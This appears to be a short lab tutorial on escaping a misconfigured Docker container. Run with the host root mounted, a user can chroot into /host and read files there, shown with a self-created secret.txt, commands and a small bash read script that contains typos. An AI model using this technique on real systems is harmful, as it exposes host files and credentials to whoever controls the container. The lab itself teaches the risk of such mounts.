# Exploit the misconfigured Docker container

Mission: view the secret on the host machine from the Docker container with the misconfigured `-v` flag!

Before going to the following steps, first create a `secret.txt` file on the host machine.

### Fire up the container
```bash
$ docker run -it -v /:/host bash
bash-4.4#

# Install the Vim editor, or anything text editor you prefer!
$ apk add vim
```

### Start Exploiting (without scripting)
```bash
# Change the root directory
$ chroot /host

$ cd home

# Type in your username of operating system
# Use `whoami` to look it up!
$ cd [YOUR_USERNAME]

$ cat secret.txt
THE_SECRET!
```

### Exploit with script
```bash
# This is the script named `show_host_secret.sh`
while IPS= read -r line
do
    echo $line
done < /home/robinhung/secret.txt

# Make sure to change `robinhung` to your username!
# You can use `whoami` command to find out your username!
```

```bash
# Command Line execution to utilize the script!

# Change root directory
$ chroot /host

# Create the script file
$ vim show_host_secert.sh

# Run the script!
$ bash show_host_secret.sh
THE_SECRET!
```

### Takeaways

It's extremely dangerous to mount the local filesystem to the docker container! ALL of your local file in this case will be exposed to the container!!!
